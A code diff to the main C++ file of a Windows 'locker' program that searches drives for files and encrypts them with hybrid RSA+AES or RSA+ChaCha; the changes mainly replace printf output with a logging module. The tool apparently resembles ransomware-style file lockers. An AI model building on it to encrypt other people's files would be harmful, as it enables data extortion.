@@ -15,6 +15,7 @@
 #include "filesystem.h"
 #include "locker.h"
 #include "threadpool.h"
+#include "logs.h"
 
 #include <string>
 #include <vector>
@@ -280,9 +281,9 @@ VOID ParsingCommandLine(int argc_, char** argv, WCHAR** wargv_)
             if (method)
             {
                 if (memory::StrStrCW(method, L"aes"))
-                    global::SetEncryptMethod(AES256);
+                    global::SetEncryptMethod(RSA_AES256);
                 else
-                    global::SetEncryptMethod(CHACHA);
+                    global::SetEncryptMethod(RSA_CHACHA);
             }            
             
             EcnryptChoice = GetCommandLineArgCurr(argc, wargv, L"crypt");
@@ -604,9 +605,9 @@ STATIC VOID free_vector(std::vector<CHAR*>* strings, std::vector<WCHAR*>* string
 STATIC VOID free_HashList(SLIST<locker::HLIST>* HashList);
 STATIC VOID LeadTime(LONGLONG end, LONGLONG start, LONGLONG freq);
 int main(int argc, char** argv)
-{  
+{    
     CHAR* pars = GetCommandLineArgChCurr(argc, argv, "config");    
-    if (pars)
+    if (pars)    
     {
         std::vector<CHAR*>* strings = new std::vector<CHAR*>;
         std::vector<WCHAR*>* stringsW = new std::vector<WCHAR*>;
@@ -631,6 +632,7 @@ int main(int argc, char** argv)
     LARGE_INTEGER start, end, freq;
     QueryPerformanceFrequency(&freq);
     QueryPerformanceCounter(&start);
+    logs::initLog();
 
     SLIST<HASH_LIST>* HashList = NULL;
     if (Signature)
@@ -640,15 +642,15 @@ int main(int argc, char** argv)
     CRYPT_INFO* CryptInfo = locker::GeneratePolicy(&system);
     if (!CryptInfo)
     {
-        printf("Not found algorithm.\n");
+        LOG_ERROR(L"Not found algorithm.\n");
         return EXIT_SUCCESS;
     }
-    
+
     if (static_cast<int>(global::GetCryptName()) || global::GetRsaBase64())
     {
         if (!LoadCrypt32())
         {
-            printf("Failed to load Crypt32.dll; GetLastError = %lu\n", GetLastError());
+            LOG_ERROR(L"Failed to load Crypt32.dll; GetLastError = %lu\n", GetLastError());
             if (global::GetRsaBase64() && global::GetEncrypt() != EncryptCipher::SYMMETRIC)
                 return EXIT_FAILURE;
             global::SetCryptName(Name::NONE);
@@ -657,9 +659,9 @@ int main(int argc, char** argv)
 
     if (Gen)
     {
-        if (!locker::HandlerASymmetricGenKey())
+        if (!locker::HandlerGenKeyPairRSA())
         {
-            printf_s("Failed to create keys");
+            LOG_ERROR(L"Failed to create keys");
             return EXIT_FAILURE;
         }
         return EXIT_SUCCESS;
@@ -668,10 +670,10 @@ int main(int argc, char** argv)
     LIST<pathsystem::DRIVE_INFO>* DriveInfo = new LIST<pathsystem::DRIVE_INFO>;
     PDRIVE_INFO data = NULL;
     size_t f = pathsystem::StartLocalSearch(DriveInfo, global::GetPath());
-    if (f == 0) { printf("No files. null\n");goto exit; }
+    if (f == 0) { LOG_ERROR(L"No files. null\n");goto exit; }
     LIST_FOREACH(data, DriveInfo)
     {
-        printf_s("Filename: %ls\n", data->Filename);
+        LOG_INFO(L"Filename: %ls", data->Filename);
     }
     data = NULL;
     if (f == 1 || THREAD_ENABLE)
@@ -717,11 +719,10 @@ exit:
     if (HashList)
         free_HashList(HashList);
     
-    printf_s("SUCCESS\n");
+    LOG_SUCCESS(L"EXIT_SUCCESS");
     QueryPerformanceCounter(&end);
     LeadTime(end.QuadPart, start.QuadPart, freq.QuadPart);
-
-    
+    logs::CloseLog();
     _CrtDumpMemoryLeaks(); 
     
     return EXIT_SUCCESS;
@@ -756,10 +757,11 @@ STATIC VOID LeadTime(LONGLONG end, LONGLONG start, LONGLONG freq)
     {
         auto minutes = total_seconds / 60;
         auto seconds = total_seconds % 60;
-        printf_s("LeadTime: %lld min %lld seconds\n", minutes, seconds);        
+        LOG_INFO(L"LeadTime: %d min %d seconds", minutes, seconds);        
     }
-    else
-        printf_s("LeadTime: %lld seconds\n", total_seconds);
+    else        
+        LOG_INFO(L"LeadTime: %d seconds", total_seconds);
+
 }
 
 VOID CommandLineHelper()
